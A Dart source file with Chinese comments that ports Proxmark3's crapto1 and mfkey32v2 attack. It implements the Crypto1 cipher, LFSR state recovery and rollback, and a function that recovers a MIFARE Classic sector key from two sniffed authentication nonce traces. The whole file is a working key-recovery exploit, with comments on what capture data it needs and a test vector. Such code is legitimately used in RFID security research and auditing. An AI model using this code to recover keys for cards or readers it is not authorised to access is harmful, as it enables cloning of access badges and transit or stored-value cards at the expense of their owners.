// Crypto1 / Crapto1 —— MIFARE Classic 的密钥恢复核心算法（Dart 移植）。
//
// 用途：从两次「认证会话」的 nonce 记录里反推出扇区密钥（即 mfkey32 攻击）。
// 这是唯一能在**离线**状态下真正算出 MIFARE Classic 密钥的方法。注意它需要
// 的是 nonce 记录（读卡器与卡片交互时抓到的密文随机数），而不是卡片转储：
// 转储里存的是「认证通过之后读出来的明文」，没有密文也没有 nonce，无法作为
// 校验候选密钥的靶子，所以纯转储永远算不出密钥。
//
// 算法出处：Proxmark3 的 crapto1（bla <blapost@gmail.com>，GPLv3）与
// mfkey32v2。这里逐句移植以保证正确性，因此同样受 GPLv3 约束——本项目若对外
// 分发需遵守 GPLv3。原始 C 代码使用 uint32 运算，Dart 的 int 是 64 位，
// 所有会产生溢出的地方都用 `_u32()` 显式截断，否则结果会与 C 版不一致。
//
// 正确性由 test/crypto1_test.dart 中的公开测试向量锁定：
//   uid=2a234f80 nt0=240bd022 {nr0}=ad2e1687 {ar0}=57e6f7e4
//   nt1=18a4bd3e {nr1}=accc1a23 {ar1}=6f10e401  =>  key=a0a1a2a3a4a5

import 'dart:typed_data';

/// Crypto1 的线性反馈多项式（拆成奇偶两半，与硬件一致）
const int _lfPolyOdd = 0x29CE5C;
const int _lfPolyEven = 0x870804;

/// 模拟 C 的 uint32 截断。Dart 的 int 是 64 位有符号，不截断就会算错。
int _u32(int x) => x & 0xFFFFFFFF;

// ---------------------------------------------------------------- filter LUT

Uint8List? _filterLut;

/// filter 函数只用到输入的低 20 位，所以可以用 1M 项的表把调用变成一次数组取值。
Uint8List get _lut {
  final cached = _filterLut;
  if (cached != null) return cached;
  final t = Uint8List(1 << 20);
  for (var i = 0; i < (1 << 20); i++) {
    t[i] = _filterRaw(i);
  }
  _filterLut = t;
  return t;
}

/// Crypto1 的非线性滤波函数（对应硬件里的 20 位布尔函数）
int _filterRaw(int x) {
  var f = (0xf22c0 >> (x & 0xf)) & 16;
  f |= (0x6c9c0 >> ((x >> 4) & 0xf)) & 8;
  f |= (0x3c8b0 >> ((x >> 8) & 0xf)) & 4;
  f |= (0x1e458 >> ((x >> 12) & 0xf)) & 2;
  f |= (0x0d938 >> ((x >> 16) & 0xf)) & 1;
  return (0xEC57E80A >> f) & 1;
}

int _filter(int x) => _lut[x & 0xfffff];

/// 偶数奇偶校验：返回 1 当且仅当置位个数为奇数（等价于 C 的 __builtin_parity）。
int _evenParity32(int x) {
  x &= 0xFFFFFFFF;
  x ^= x >> 16;
  x ^= x >> 8;
  x ^= x >> 4;
  x ^= x >> 2;
  x ^= x >> 1;
  return x & 1;
}

// ------------------------------------------------------------- Crypto1 状态机

/// Crypto1 的 48 位 LFSR，拆成 odd / even 两个 24 位寄存器存放。
class Crypto1State {
  int odd;
  int even;
  Crypto1State(this.odd, this.even);
}

/// 用 48 位密钥初始化 LFSR 状态。
Crypto1State crypto1Init(int key) {
  var odd = 0;
  var even = 0;
  for (var i = 47; i > 0; i -= 2) {
    odd = (odd << 1) | ((key >> ((i - 1) ^ 7)) & 1);
    even = (even << 1) | ((key >> (i ^ 7)) & 1);
  }
  return Crypto1State(odd, even);
}

/// 时钟走一位。`isEncrypted` 为真时把输出反馈回去（解密方向）。
int _crypto1Bit(Crypto1State s, int input, int isEncrypted) {
  final ret = _filter(s.odd);
  var feedin = ret & (isEncrypted != 0 ? 1 : 0);
  feedin ^= input != 0 ? 1 : 0;
  feedin ^= _lfPolyOdd & s.odd;
  feedin ^= _lfPolyEven & s.even;
  s.even = _u32((s.even << 1) | _evenParity32(feedin));
  // 两个寄存器互换，模拟 48 位 LFSR 的单步移位
  final t = s.odd;
  s.odd = s.even;
  s.even = t;
  return ret;
}

/// 时钟走一个字节。
int crypto1Byte(Crypto1State s, int input, int isEncrypted) {
  var ret = 0;
  for (var i = 0; i < 8; i++) {
    ret |= _crypto1Bit(s, (input >> i) & 1, isEncrypted) << i;
  }
  return ret;
}

/// 时钟走一个字。位序与 C 版一致：按字节从高位字节到低位字节，
/// 每个字节内从 bit0 到 bit7（这是 `24 ^ k` 换位后的等价写法）。
int crypto1Word(Crypto1State s, int input, int isEncrypted) {
  var ret = 0;
  for (var byteIdx = 3; byteIdx >= 0; byteIdx--) {
    for (var b = 0; b < 8; b++) {
      final j = byteIdx * 8 + b;
      ret |= _crypto1Bit(s, (input >> j) & 1, isEncrypted) << j;
    }
  }
  return ret;
}

/// 从当前 LFSR 状态还原 48 位密钥。
int crypto1GetLfsr(Crypto1State s) {
  var lfsr = 0;
  for (var i = 23; i >= 0; --i) {
    lfsr = (lfsr << 1) | ((s.odd >> (i ^ 3)) & 1);
    lfsr = (lfsr << 1) | ((s.even >> (i ^ 3)) & 1);
  }
  return lfsr;
}

/// 正向加密（读卡器方向）：喂入明文，返回**密文**。
///
/// 与 `crypto1Word(s, p, 1)` 的区别很关键：后者返回的是密钥流，调用方还得自己
/// 再异或一次；而 MIFARE 在这条通路上是**以明文回馈 LFSR**的（见
/// `lfsr_rollback_word(s, 密文, 1)` 中 `feedin = ks ^ 密文 = 明文`）。
/// 所以必须逐位先取出密钥流算出密文，再拿密文当时钟输入。
/// 主要用途是给测试造往返验证向量。
int crypto1EncryptWord(Crypto1State s, int plain) {
  var out = 0;
  for (var byteIdx = 3; byteIdx >= 0; byteIdx--) {
    for (var b = 0; b < 8; b++) {
      final j = byteIdx * 8 + b;
      final p = (plain >> j) & 1;
      final ks = _filter(s.odd);
      final c = ks ^ p;
      _crypto1Bit(s, c, 1);
      out |= c << j;
    }
  }
  return out;
}

// ------------------------------------------------------------------- PRNG

int _swapEndian(int x) {
  x = _u32(((x >> 8) & 0xff00ff) | _u32((x & 0xff00ff) << 8));
  x = _u32((x >> 16) | _u32(x << 16));
  return x;
}

/// 卡片里的伪随机数发生器推进器。
/// 认证过程中卡片会把 `nt` 用这个 PRNG 往前推 64 位作为 `nt'`。
int prngSuccessor(int x, int n) {
  x = _swapEndian(x);
  while (n-- > 0) {
    // 注意 C 的优先级：<< 31 只作用在括号内那串异或的结果上
    x = _u32((x >> 1) |
        _u32(_u32((x >> 16) ^ (x >> 18) ^ (x >> 19) ^ (x >> 21)) << 31));
  }
  return _swapEndian(x);
}

// --------------------------------------------------------------- LFSR 回滚

int _lfsrRollbackBit(Crypto1State s, int input, int fb) {
  s.odd &= 0xffffff;
  final t = s.odd;
  s.odd = s.even;
  s.even = t;

  var out = s.even & 1;
  s.even >>= 1;
  out ^= _lfPolyEven & s.even;
  out ^= _lfPolyOdd & s.odd;
  out ^= input != 0 ? 1 : 0;
  final ret = _filter(s.odd);
  out ^= ret & (fb != 0 ? 1 : 0);

  s.even |= _evenParity32(out) << 23;
  return ret;
}

/// 回滚一个字。位序按 C 版：从低字节到高字节，字节内从 bit7 到 bit0。
int _lfsrRollbackWord(Crypto1State s, int input, int fb) {
  var ret = 0;
  for (var byteIdx = 0; byteIdx < 4; byteIdx++) {
    for (var b = 7; b >= 0; b--) {
      final j = byteIdx * 8 + b;
      ret |= _lfsrRollbackBit(s, (input >> j) & 1, fb) << j;
    }
  }
  return ret;
}

// ------------------------------------------------- 候选状态表（对应 C 的数组）

/// 用固定容量的 Uint32List + 尾部下标模拟 C 里「预分配数组 + head/tail 指针」。
class _Tbl {
  final Uint32List v;
  int end = -1;
  _Tbl(int cap) : v = Uint32List(cap);

  void add(int x) {
    if (end + 1 >= v.length) return;
    v[++end] = _u32(x);
  }

  static _Tbl of(List<int> src) {
    // 单次 extend 最多让表长翻倍（插入分支），留 4 倍余量足够
    final t = _Tbl(src.length * 4 + 4096);
    for (final x in src) {
      t.v[++t.end] = _u32(x);
    }
    return t;
  }

  void clear() => end = -1;
  bool get isEmpty => end < 0;
  int get length => end + 1;
}

/// 对应 C 的 update_contribution：把移位过程中「移出去」的比特攒到高位，
/// 供后面的分桶（bucket sort）使用。少了它桶内配对就会错。
void _updateContribution(_Tbl t, int i, int m1, int m2) {
  var p = t.v[i] >> 25;
  p = (p << 1) | _evenParity32(t.v[i] & m1);
  p = (p << 1) | _evenParity32(t.v[i] & m2);
  t.v[i] = _u32(_u32(p << 24) | (t.v[i] & 0xffffff));
}

/// 对应 C 的 extend_table_simple：用一位密钥流把候选表往左推一格并筛选。
void _extendSimple(_Tbl t, int bit) {
  if (t.isEmpty) return;
  var i = 0;
  var end = t.end;
  t.v[0] = _u32(t.v[0] << 1);
  while (i <= end) {
    final f0 = _filter(t.v[i]);
    if (f0 != _filter(t.v[i] | 1)) {
      // 低位能决定输出：只保留匹配的那一支
      t.v[i] = _u32(t.v[i] | (f0 ^ bit));
    } else if (f0 == bit) {
      // 低位不影响输出：两支都保留
      if (end + 1 < t.v.length) {
        end++;
        t.v[end] = t.v[i + 1];
        t.v[i + 1] = _u32(t.v[i] | 1);
        // 对应 C 里 `*++tbl`：插入这一支后要跳过它，它已经是完整候选，
        // 不能再被下一轮 `<<= 1` 移位。少了这一句候选表会错误膨胀。
        i++;
      } else {
        // 容量不足（理论上不会发生）：退化成 replace，宁可多留也不丢候选
        t.v[i] = _u32(t.v[i] | (f0 ^ bit));
      }
    } else {
      // 两支都不行：把队尾元素搬过来，缩小表
      t.v[i] = t.v[end];
      i--;
      end--;
    }
    i++;
    if (i <= end) t.v[i] = _u32(t.v[i] << 1);
  }
  t.end = end;
}

/// 对应 C 的 extend_table：与 simple 的区别是同时把 `in`（已知输入位）
/// 和贡献位维护起来——分桶配对依赖它们。
void _extendTable(_Tbl t, int bit, int m1, int m2, int inBits) {
  if (t.isEmpty) return;
  final in24 = _u32(inBits << 24);
  var i = 0;
  var end = t.end;
  t.v[0] = _u32(t.v[0] << 1);
  while (i <= end) {
    final v = t.v[i];
    final f0 = _filter(v);
    if (f0 != _filter(v | 1)) {
      t.v[i] = _u32(v | (f0 ^ bit));
      _updateContribution(t, i, m1, m2);
      t.v[i] = _u32(t.v[i] ^ in24);
    } else if (f0 == bit) {
      if (end + 1 < t.v.length) {
        end++;
        t.v[end] = t.v[i + 1];
        t.v[i + 1] = _u32(t.v[i] | 1);
        _updateContribution(t, i, m1, m2);
        t.v[i] = _u32(t.v[i] ^ in24);
        i++;
        _updateContribution(t, i, m1, m2);
        t.v[i] = _u32(t.v[i] ^ in24);
      } else {
        // 容量不足（理论上不会发生）：退化成 replace，宁可多留也不丢候选
        t.v[i] = _u32(v | (f0 ^ bit));
        _updateContribution(t, i, m1, m2);
        t.v[i] = _u32(t.v[i] ^ in24);
      }
    } else {
      t.v[i] = t.v[end];
      i--;
      end--;
    }
    i++;
    if (i <= end) t.v[i] = _u32(t.v[i] << 1);
  }
  t.end = end;
}

/// 对应 C 的 recover：4 位一组地收窄候选表，然后分桶配对，
/// 最后把「奇数表 × 偶数表」的笛卡尔积还原成一批 LFSR 状态。
void _recover(
  _Tbl o,
  _Tbl e,
  int oks,
  int eks,
  int rem,
  List<Crypto1State> out,
  int inBits,
  List<List<int>> bEven,
  List<List<int>> bOdd,
) {
  if (rem == -1) {
    for (var ei = 0; ei <= e.end; ei++) {
      final ev = _u32(_u32(e.v[ei] << 1) ^
          _evenParity32(e.v[ei] & _lfPolyEven) ^
          ((inBits & 4) != 0 ? 1 : 0));
      e.v[ei] = ev;
      for (var oi = 0; oi <= o.end; oi++) {
        out.add(Crypto1State(
          ev ^ _evenParity32(o.v[oi] & _lfPolyOdd),
          o.v[oi],
        ));
      }
    }
    return;
  }

  for (var i = 0; i < 4 && rem-- != 0; i++) {
    oks >>= 1;
    eks >>= 1;
    inBits >>= 2;
    _extendTable(o, oks & 1, _u32(_lfPolyEven << 1) | 1, _u32(_lfPolyOdd << 1), 0);
    if (o.isEmpty) return;
    _extendTable(e, eks & 1, _lfPolyOdd, _u32(_lfPolyEven << 1) | 1, inBits & 3);
    if (e.isEmpty) return;
  }

  // 分桶：按贡献位（最高字节）分组，只在两边都非空的桶里配对。
  // 这一剪枝不是可选优化——去掉它会漏掉/多出候选，必须保留。
  for (final b in bEven) {
    b.clear();
  }
  for (final b in bOdd) {
    b.clear();
  }
  for (var i = 0; i <= e.end; i++) {
    bEven[(e.v[i] >> 24) & 0xFF].add(e.v[i]);
  }
  for (var i = 0; i <= o.end; i++) {
    bOdd[(o.v[i] >> 24) & 0xFF].add(o.v[i]);
  }

  final subBuckets = <List<_Tbl>>[];
  for (var j = 0xFF; j >= 0; j--) {
    if (bEven[j].isEmpty || bOdd[j].isEmpty) continue;
    // 用独立副本递归，避免子表的扩容把父表数据覆盖掉
    final subO = _Tbl.of(bOdd[j]);
    final subE = _Tbl.of(bEven[j]);
    subBuckets.add([subO, subE]);
  }
  // 必须先把本层所有桶快照完再递归：bEven/bOdd 是各层共用的，
  // 一旦递归下去就会被下一层清空重填，边递归边取会把父层的数据读脏。
  for (final b in subBuckets.reversed) {
    _recover(b[0], b[1], oks, eks, rem, out, inBits, bEven, bOdd);
  }
}

/// 已知 32 位密钥流，枚举出所有能产生它的 LFSR 状态。
List<Crypto1State> lfsrRecovery32(int ks2, int input) {
  var oks = 0;
  var eks = 0;
  // 密钥流按奇偶拆开，注意 C 里用的是 BEBIT（bit n^24）
  for (var i = 31; i >= 0; i -= 2) {
    oks = (oks << 1) | ((ks2 >> (i ^ 24)) & 1);
  }
  for (var i = 30; i >= 0; i -= 2) {
    eks = (eks << 1) | ((ks2 >> (i ^ 24)) & 1);
  }

  final odd = _Tbl(1 << 21);
  final even = _Tbl(1 << 21);

  // 用最低位密钥流筛出第一轮候选
  for (var i = 1 << 20; i >= 0; --i) {
    final f = _filter(i);
    if (f == (oks & 1)) odd.add(i);
    if (f == (eks & 1)) even.add(i);
  }

  // 再看接下来 8 位（奇偶各 4 位）
  for (var i = 0; i < 4; i++) {
    oks >>= 1;
    eks >>= 1;
    _extendSimple(odd, oks & 1);
    _extendSimple(even, eks & 1);
  }

  var inBits = input;
  inBits = _u32((inBits >> 16 & 0xff) | _u32(inBits << 16) | (inBits & 0xff00));

  final out = <Crypto1State>[];
  final bEven = List.generate(0x100, (_) => <int>[]);
  final bOdd = List.generate(0x100, (_) => <int>[]);
  _recover(odd, even, oks, eks, 11, out, _u32(inBits << 1), bEven, bOdd);
  return out;
}

/// mfkey32：用两次认证会话的 nonce 记录恢复扇区密钥。
///
/// 参数全部是 32 位无符号整数（十六进制文本解析而来）：
///   [uid]    卡片 UID（1K 卡取前 4 字节）
///   [nt0]/[nt1]        两次会话里卡片发的明文随机数
///   [nr0Enc]/[nr1Enc]  两次会话里读卡器回的**加密**随机数 {nr}
///   [ar0Enc]/[ar1Enc]  两次会话里卡片回的**加密**随机数 {ar}
///
/// 返回 48 位密钥；找不到返回 null（说明输入数据不完整或不属于同一次认证）。
int? recoverMifareKeyFromNonces({
  required int uid,
  required int nt0,
  required int nr0Enc,
  required int ar0Enc,
  required int nt1,
  required int nr1Enc,
  required int ar1Enc,
}) {
  final uid32 = _u32(uid);
  final nt0x = _u32(nt0);
  final nt1x = _u32(nt1);

  // 卡片会把 nt 用 PRNG 推进 64 位得到 nt'，{ar} 就是 keystream 异或 nt'
  final p64 = prngSuccessor(nt0x, 64);
  final p64b = prngSuccessor(nt1x, 64);
  final ks2 = _u32(ar0Enc ^ p64);

  final states = lfsrRecovery32(ks2, 0);
  for (final t in states) {
    // 从 Keystream 处回滚：先经过 {ar}，再经过 {nr}，最后经过 uid^nt
    _lfsrRollbackWord(t, 0, 0);
    _lfsrRollbackWord(t, _u32(nr0Enc), 1);
    _lfsrRollbackWord(t, _u32(uid32 ^ nt0x), 0);
    final key = crypto1GetLfsr(t);

    // 用第二次会话验证：预测出来的 {ar1} 必须对得上
    crypto1Word(t, _u32(uid32 ^ nt1x), 0);
    crypto1Word(t, _u32(nr1Enc), 1);
    if (_u32(ar1Enc) == _u32(crypto1Word(t, 0, 0) ^ p64b)) {
      return key;
    }
  }
  return null;
}

/// 把 48 位密钥格式化成 12 位大写十六进制（MIFARE 密钥的常见写法）。
String formatMifareKey(int key) =>
    key.toRadixString(16).padLeft(12, '0').toUpperCase();
